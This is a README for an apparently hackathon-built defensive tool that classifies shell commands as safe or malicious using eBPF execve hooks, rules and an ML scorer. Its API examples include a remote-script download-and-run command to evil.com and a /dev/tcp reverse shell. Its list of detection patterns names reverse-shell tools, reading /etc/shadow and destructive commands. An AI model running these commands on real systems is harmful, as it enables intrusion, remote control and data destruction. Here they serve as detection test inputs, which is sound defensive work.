# README for AI Bouncer + Kernel Guard RCE Prevention System

## 🎯 Overview

**AI Bouncer + Kernel Guard** is a real-time RCE (Remote Code Execution) prevention system that combines:

1. **Kernel Guard**: eBPF-based kernel hooks monitoring system calls
2. **AI Bouncer**: Machine learning + rule-based threat detection
3. **Dashboard**: Real-time visualization of detected threats

This is a hackathon project. API + dashboard run well on Windows/Linux, while kernel eBPF hooks require Linux (kernel 5.4+). On WSL2, the backend falls back to API-only mode and skips eBPF pre-compilation.

---

## 🚀 Quick Start

### Prerequisites

**Linux** (Ubuntu 20.04+ or Debian 11+, kernel 5.4+):
- Python 3.8+
- Node.js 16+
- Sudo/root access (for eBPF)

**Windows** (API & Dashboard only):
- [Miniconda](https://docs.conda.io/projects/miniconda/en/latest/) (Python 3.11 recommended)
- Node.js 16+
- Note: eBPF kernel hooks require Linux

---

### Setup on Linux

```bash
cd kernal_ai_bouncer

# 1. Backend
bash scripts/setup_backend.sh
source venv/bin/activate
python backend/models/train_model.py  # Train ML model

# 2. Kernel Monitoring
bash scripts/setup_kernel.sh

# 3. Frontend
bash scripts/setup_frontend.sh

# 4. Run
# Terminal 1: Backend (from project root)
uvicorn backend.app:app --host 0.0.0.0 --port 8000 --reload --reload-dir backend

# Terminal 2: Frontend
cd frontend && npm run dev

# Open http://localhost:5173
```

If you are on WSL2, keep the same backend and frontend setup, but expect kernel monitoring to degrade gracefully. The Python BCC loader will still run, while the Makefile pre-compilation step is optional and skipped on WSL2.

---

### Setup on Windows (Validated)

**Note:** eBPF kernel monitoring is Linux-only. Windows supports the API and dashboard (rules + heuristic ML).

```powershell
# 1. Install Miniconda (https://docs.conda.io/projects/miniconda/en/latest/)
#    Then accept terms:
conda tos accept --override-channels --channel https://repo.anaconda.com/pkgs/main
conda tos accept --override-channels --channel https://repo.anaconda.com/pkgs/r
conda tos accept --override-channels --channel https://repo.anaconda.com/pkgs/msys2

# 2. Create environment (from project root)
conda create -n aibouncer python=3.11 -y
conda activate aibouncer

# 3. Install backend dependencies
pip install -r backend/requirements.txt

# 4. Train model (optional but recommended)
python backend/models/train_model.py

# 5. Install frontend dependencies
cd frontend
npm install

# 6. Run (two terminals)
# Terminal 1: Backend (from project root)
conda activate aibouncer
cd C:\Users\raphe\Webdev\Projects\kernal_ai_bouncer
uvicorn backend.app:app --host 0.0.0.0 --port 8000 --reload --reload-dir backend
# API: http://localhost:8000
# Docs: http://localhost:8000/docs

# Terminal 2: Frontend
cd frontend
npm run dev
# Dashboard: http://localhost:5173
```

If running demo traffic from WSL while backend runs on Windows, use:
```bash
bash scripts/demo.sh
```
The script auto-detects WSL and chooses a reachable backend URL.

Test the API:
```powershell
# Analyze a command
curl -X POST http://localhost:8000/analyze `
  -H "Content-Type: application/json" `
  -d '{"command":"echo safe"}'
```

---

## 🏗️ Architecture

```
User Command
    ↓
Kernel Guard (eBPF)
    ↓
AI Bouncer (Detection Pipeline)
    ├─ Rule Engine (60% weight)
    └─ ML Scorer (40% weight)
    ↓
Decision Engine (Risk Score)
    ↓
Dashboard (WebSocket)
```

---

## 📁 Project Structure

```
kernal_ai_bouncer/
├── backend/                    # Python FastAPI server
│   ├── app.py                 # Main API + WebSocket
│   ├── detection/             # Detection pipeline
│   │   ├── rule_engine.py     # Rule-based detection
│   │   ├── ml_scorer.py       # ML inference
│   │   └── pipeline.py        # Combined scoring
│   ├── models/                # ML training
│   │   ├── train_model.py     # Train scikit-learn model
│   │   └── trained_model.pkl  # Generated locally (gitignored)
│   ├── kernel/                # eBPF interface
│   │   ├── rce_monitor.py     # BCC loader
│   │   └── execve_hook.py     # Execve hook manager
│   └── events/                # Event storage
│       ├── models.py          # Event dataclasses
│       └── event_store.py     # In-memory buffer
├── kernel/                    # eBPF C programs
│   ├── execve_hook.c          # Execve tracepoint hook
│   └── Makefile
├── frontend/                  # React dashboard
│   └── src/
│       ├── App.tsx
│       ├── Dashboard.tsx
│       └── ...
├── data/
│   ├── commands_safe.txt      # 100 safe commands
│   ├── commands_malicious.txt # 100 malicious commands
│   └── logs/                  # Runtime event logs
└── scripts/
    ├── setup_kernel.sh        # Kernel deps
    ├── setup_backend.sh       # Python env
    ├── setup_frontend.sh      # Node env
    ├── demo.sh                # Bash demo (Linux/WSL-aware)
    ├── demo.ps1               # PowerShell demo (Windows)
    ├── test_attacks.sh        # Test suite
    └── test_ws_broadcast.py   # In-process WebSocket/API sanity test
```

---

## 🛡️ Detection Pipeline

### Risk Scoring
- **Rule Score** (60%): Keyword/pattern matching (0-100)
- **ML Score** (40%): Logistic Regression classification (0-100)
- **Final Score**: `0.6 × rule_score + 0.4 × ml_score`

### Classification
- **Safe** (< 30): Allow execution
- **Suspicious** (30-70): Log and allow
- **Malicious** (> 70): Block and alert

### Detected Attack Patterns
- Command injection (`;`, `&&`, `|`)
- Shell escapes (bash, sh, eval, exec)
- Reverse shells (/dev/tcp, nc, socat)
- Data exfiltration (cat /etc/shadow, etc.)
- Privilege escalation (sudo, su)
- Encoded payloads (base64, hex)
- Destructive commands (rm -rf /, mkfs, dd)

---

## 📊 API Endpoints

### Analyze Command
```bash
curl -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -d '{"command":"curl http://evil.com/script.sh | bash"}'
```

**Response**:
```json
{
  "command": "curl http://evil.com/script.sh | bash",
  "classification": "malicious",
  "risk_score": 85.2,
  "matched_rules": ["shell_piping"],
  "ml_confidence": 0.92
}
```

### WebSocket Events
Connect to `ws://localhost:8000/ws` to receive real-time events:
```json
{
  "id": "evt_12345",
  "command": "ls -la",
  "pid": 1234,
  "uid": 1000,
  "risk_score": 10.5,
  "classification": "safe",
  "matched_rules": [],
  "timestamp": 1699500000.123
}
```

---

## 🧪 Testing

Run the demo to see the system in action:
```bash
bash scripts/demo.sh
```

On Windows PowerShell:
```powershell
.\scripts\demo.ps1
```

Test individual commands via API:
```bash
# Safe command
curl -X POST http://localhost:8000/analyze \
  -d '{"command":"ls -la"}' \
  -H "Content-Type: application/json"

# Malicious command
curl -X POST http://localhost:8000/analyze \
  -d '{"command":"bash -i >& /dev/tcp/attacker/4444 0>&1"}' \
  -H "Content-Type: application/json"
```

---

## ⚙️ Configuration

Environment variables (create `.env` in `backend/`):
```
EBPF_ENABLED=true          # Enable eBPF kernel monitoring
ML_MODEL_PATH=backend/models/trained_model.pkl
MAX_EVENTS=1000            # Max events to store in memory
LOG_LEVEL=INFO
```

---

## 📝 Implementation Notes

### Phase Status
- [x] Phase 1: Infrastructure & Setup
- [x] Phase 2: Kernel Guard (eBPF) - In-kernel execve monitoring via ring buffer
- [x] Phase 3: Real-time integration - kernel events flow into detection, storage, and WebSocket broadcast
- [x] Phase 4: React dashboard live updates and severity highlighting
- [ ] Phase 5: Demo & polish (additional hardening, packaging, and optional persistence)

### Known Limitations (MVP)
- eBPF monitoring is Linux-only (API/dashboard run cross-platform)
- Requires root/CAP_BPF for eBPF
- On WSL2, eBPF pre-compilation is intentionally skipped and the backend runs in API-only mode
- LLM reasoning deferred to post-MVP
- No persistence (in-memory events only)

### Future Enhancements
- Windows/Mac support (ETW, DTrace)
- SQLite persistence
- Async LLM explanation layer
- Custom rule builder UI
- Alert integrations (Slack, PagerDuty)

---

## 📚 Documentation

- [docs/README.md](docs/README.md) - Documentation hub and entry point
- [docs/QUICK_START.md](docs/QUICK_START.md) - Fast setup and test flow
- [SETUP.md](docs/SETUP.md) - Detailed Linux environment setup
- [ARCHITECTURE.md](docs/ARCHITECTURE.md) - System design deep dive
- [API.md](docs/API.md) - Complete API reference

---

## 👥 Contributing

This is a hackathon project. For improvements:
1. Check existing [docs/](docs/) for architecture
2. Follow Python (PEP 8) and JavaScript (ESLint) standards
3. Add tests for new detection patterns
4. Document changes in code

---

## 📄 License

Hackathon Project - MIT License

---

## ❓ Troubleshooting

**eBPF program fails to load**
- Check kernel version: `uname -r` (need 5.4+)
- Verify BCC installed: `python3 -c 'from bcc import BPF'`
- Try running as root: `sudo python backend/app.py`
- On WSL2, this is expected; the system should continue in API-only mode

**ML model not found**
- Train model first: `python backend/models/train_model.py`
- Verify file exists at `backend/models/trained_model.pkl`

**WebSocket connection fails**
- Backend running on port 8000?
- If backend is launched from `frontend/`, imports may fail. Start backend from project root.
- Frontend proxy configured? Check `frontend/vite.config.ts`

---

Built for the Hackathon
